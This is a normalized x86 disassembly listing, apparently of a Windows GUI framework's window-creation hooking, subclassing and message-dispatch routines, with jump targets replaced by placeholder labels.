cmp [ esi + 0x1c ] edi
je r-xdata
push 0x4
mov ecx esi
pop ebx
call sub_44163f
test ah 0x1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x58 ]
mov ecx esi
call sub_43de48
mov eax [ esi + 0x2c ]
call [ GetActiveWindow@IAT ]
cmp eax [ esi + 0x1c ]
jne r-xdata
push 0x97
push edi
push edi
push edi
push edi
push edi
mov ecx esi
call sub_4417b0
jmp r-xdata
push ebx
mov ecx esi
call sub_440fdc
push 0x5
pop ebx
push [ ebp - 0x14 ]
call [ SetActiveWindow@IAT ]
sub_43e00d
push esi
push edi
push [ esp + 0xc ]
mov esi ecx
mov edi [ esi ]
call sub_44774c
push eax
mov ecx esi
call [ edi + 0xc0 ]
mov ecx esi
call sub_43e71a
pop edi
pop esi
retn 0x8
sub_43e032
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0xcc ]
call sub_45357b
mov ecx [ eax + 0x1038 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_43e71a
mov edi eax
test edi edi
je r-xdata
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
test [ esi + 0x25 ] 0x1
je r-xdata
mov edx [ esi + 0x4c ]
test edx edx
je r-xdata
push 0x0
push 0x0
push [ esi + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
mov edx [ ecx ]
push eax
push [ esi + 0x40 ]
push esi
call [ edx + 0x20 ]
mov edi [ ecx ]
push eax
push edx
push esi
call [ edi + 0x1c ]
jmp r-xdata
mov ecx eax
call sub_441868
xor edi edi
push 0xffffffff
mov ecx esi
call sub_43dfea
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
retn 0x8
sub_43e0ba
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_45357b
xor edi edi
cmp [ eax + 0x4 ] edi
jne r-xdata
call sub_420710
cmp eax edi
mov esi 0xe146
je r-xdata
xor eax eax
jmp r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
mov edx [ eax ]
push edi
push esi
mov ecx eax
call [ edx + 0xc ]
mov edx [ eax ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
push edi
push esi
mov ecx eax
call [ edx + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push 0x1
pop eax
jmp r-xdata
sub_43e113
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
push [ esi + 0x40 ]
mov ecx esi
call sub_440d85
push eax
call sub_440dd5
jmp r-xdata
push 0xffffffff
mov ecx esi
call sub_43dfea
xor eax eax
pop esi
retn
push 0x0
mov ecx esi
call sub_440b18
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0xe146
mov ecx esi
call sub_441585
mov esi eax
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
call sub_43e0ba
neg eax
sbb eax eax
mov ecx esi
and eax 0x5
push eax
call sub_4417ff
sub_43e199
push esi
push edi
mov edi ecx
cmp [ edi + 0x40 ] 0x0
mov esi [ edi + 0x48 ]
mov eax [ edi + 0x44 ]
je r-xdata
test eax eax
je r-xdata
push ebx
call sub_45357b
mov ebx [ eax + 0xc ]
push 0x5
push [ edi + 0x40 ]
push ebx
call [ FindResourceA@IAT ]
push eax
push ebx
call [ LoadResource@IAT ]
pop ebx
push 0x1
test esi esi
pop eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov esi eax
pop edi
pop esi
retn
cmp [ esi + 0x2 ] 0xffff
mov ecx [ esi ]
jne r-xdata
mov ax [ esi + 0xa ]
mov si [ esi + 0xc ]
mov ecx [ esi + 0xc ]
mov ax [ esi + 0x12 ]
mov si [ esi + 0x14 ]
jmp r-xdata
xor eax eax
test ax ax
jne r-xdata
test cx 0x1801
jne r-xdata
test si si
jne r-xdata
push 0x1
pop eax
jmp r-xdata
sub_43e229
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
push 0x1
push esi
mov ecx eax
call [ edx + 0x98 ]
xor eax eax
lea esi [ eax + 0x20000 ]
test esi esi
je r-xdata
pop esi
retn 0x8
sub_43e388
push esi
mov esi ecx
call sub_44195c
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_42dc30
add esp 0xc
mov eax esi
pop esi
retn
sub_43e3c6
push esi
push edi
mov esi ecx
call sub_44195c
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_42dc30
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_43e3f2
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
mov ecx [ ebp + 0x10 ]
not ecx
and ecx eax
or ecx [ ebp + 0x14 ]
cmp eax ecx
jne r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowLongA@IAT ]
mov eax [ ebp + 0x18 ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
or al 0x17
push eax
push ecx
push ecx
push ecx
push ecx
push ecx
push [ ebp + 0x8 ]
call [ SetWindowPos@IAT ]
pop ebp
retn 0x14
sub_43e498
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_44163f
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_441826
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_440bd0
sub_43e511
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_44163f
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_43fd7e
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_43fd7e
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_43e572
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_43fd7e
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_43e7b3
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_43e7b3
cmp esi eax
je r-xdata
mov ecx esi
call sub_441826
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_43e5e8
mov eax sub_463064
call sub_42dc88
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_452fff
call sub_45518e
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0xc ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x8 ] eax
jne r-xdata
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_43e475
mov eax [ ecx ]
push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x8 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0xc ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_43e498
jmp r-xdata
sub_43e692
call sub_4428ff
test eax eax
je r-xdata
and [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0x10 ]
call [ edx + 0x6c ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_442f87
mov eax r-xdata
retn
sub_43e6e5
push esi
push sub_452fff
mov ecx rw-data
call sub_45518e
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_43e71a
push esi
mov esi ecx
push sub_452fff
mov ecx rw-data
call sub_45518e
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_43e741
mov eax sub_46307a
call sub_42dc88
push esi
call sub_4535a1
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_447ab1
call sub_441e77
push 0x48
mov ebx eax
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_4434bc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_441e77
pop ebx
sub_43e7b3
push esi
push edi
push 0x1
call sub_43e741
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_443521
mov edi eax
push esi
mov ecx edi
call sub_4418d2
mov eax edi
pop edi
pop esi
retn 0x4
sub_43e7f8
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_43e741
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_43d586
push edi
mov ecx esi
mov [ eax ] esi
call sub_4418d2
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_43e831
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_43e741
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_43d5d6
sub_43e85f
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
push esi
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_43e7da
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ DefWindowProcA@IAT ]
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
call sub_43e5e8
jmp r-xdata
sub_43e8b0
mov eax sub_463084
call sub_42dc88
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_43e7b3
push edi
mov esi eax
call sub_43e7b3
push esi
push [ ebp + 0x10 ]
push eax
call sub_43e511
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_43e7b3
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_43e572
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_43e7b3
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_43e475
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_43e498
sub_43e9d3
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_4428ff
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_442f87
mov eax r-xdata
retn
sub_43ea0f
push ebp
mov ebp esp
push esi
push edi
push sub_453033
mov ecx rw-data
call sub_455223
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_43e8b0
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_440a9b
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_43ea8b
push ebp
mov ebp esp
sub esp 0x10
push sub_452fff
mov ecx rw-data
call sub_45518e
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_45357b
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_43e7f8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_43e8aa
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_43ea0f
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_43e8b0
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_43e5e8
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_43e8aa
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_43ec81
push esi
push edi
push sub_452fff
mov ecx rw-data
call sub_45518e
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_43ea8b
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_43b7b5
sub_43eccd
push esi
push sub_452fff
mov ecx rw-data
call sub_45518e
mov esi eax
call sub_45357b
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_43ed0f
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_45357b
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_43ec81
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_43eccd
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_43edf5
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_43ed0f
pop edi
pop esi
pop ebp
retn 0x1c
sub_43ee41
mov eax sub_463098
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_43effe
sub_43eebd
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_43e71a
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_43eedb
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_4428ff
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_45357b
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_45357b
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_43e71a
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_453349
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_45b297
call sub_451740
test eax eax
je r-xdata
mov ecx esi
call sub_43e831
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_42dc30
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_43effe
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_43e741
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_43d531
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_43e831
test edi edi
mov ebx eax
jne r-xdata
sub_43f04b
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_43f0b5
push esi
call sub_453349
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_43f10c
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_44791e
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_43f17d
push esi
mov esi ecx
mov ecx [ esi + 0x38 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x88 ]
push [ esi + 0x1c ]
call [ GetWindowTextLengthA@IAT ]
lea ecx [ eax + 0x1 ]
push ecx
mov ecx [ esp + 0xc ]
push eax
call sub_4425ef
push eax
push [ esi + 0x1c ]
call [ GetWindowTextA@IAT ]
mov ecx [ esp + 0x8 ]
push 0xffffffff
call sub_4425c7
jmp r-xdata
pop esi
